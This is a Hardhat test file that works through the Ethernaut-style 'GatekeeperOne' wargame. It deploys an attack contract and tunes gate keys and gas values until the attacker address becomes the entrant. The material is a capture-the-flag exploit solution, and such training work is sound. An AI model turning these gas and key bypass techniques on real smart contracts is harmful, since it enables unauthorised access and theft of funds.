const { expect } = require("chai");
const { ethers } = require("hardhat");
require("dotenv").config();

describe("GatekeeperOne", () => {
  const INSTANCE_ADDRESS = "0x862B528E001cd58cC8b11d6749150547F17c695F";

  let attacker;
  let gatekeeperOne, gatekeeperOneAttack;

  beforeEach(async () => {
    // Setup accounts
    [deployer, attacker] = await ethers.getSigners();

    gatekeeperOne = await hre.ethers.getContractAt("GatekeeperOne", INSTANCE_ADDRESS);

    const GatekeeperOneAttack = await ethers.getContractFactory("GatekeeperOneAttack");
    gatekeeperOneAttack = await GatekeeperOneAttack.connect(attacker).deploy(gatekeeperOne.address);
  });

  describe("GatekeeperOne", () => {
    it('Passes First 2 Gates', async () => {
      const KEY = "0x1212121212121212";
      const GAS = 24829; // Solidity v8.18 used 24996

      await expect(gatekeeperOneAttack.connect(attacker).attack(KEY, GAS)).to.be.revertedWith("GatekeeperOne: invalid gateThree part one");
    });

    it('Passes Part Two', async () => {
      const KEY = "0x1200000000000012";
      const GAS = 24829;

      // console.log((await gatekeeperOneAttack.convert16(KEY)).toString());
      // console.log((await gatekeeperOneAttack.convert32(KEY)).toString());

      await expect(gatekeeperOneAttack.connect(attacker).attack(KEY, GAS)).to.be.revertedWith("GatekeeperOne: invalid gateThree part three");
    });

    it('Passes Gate Three', async () => {
      // const convertAddress = await gatekeeperOneAttack.convertAddress(attacker.address);
      // console.log(convertAddress.toString());

      const KEY = "0x79C80000000079C8";
      const GAS = 24829;

      // console.log((await gatekeeperOneAttack.convert16(KEY)).toString());
      // console.log((await gatekeeperOneAttack.convert32(KEY)).toString());

      const transaction = await gatekeeperOneAttack.connect(attacker).attack(KEY, GAS);
      await transaction.wait();

      expect(await gatekeeperOne.entrant()).to.equal(attacker.address);
    });
  });
});
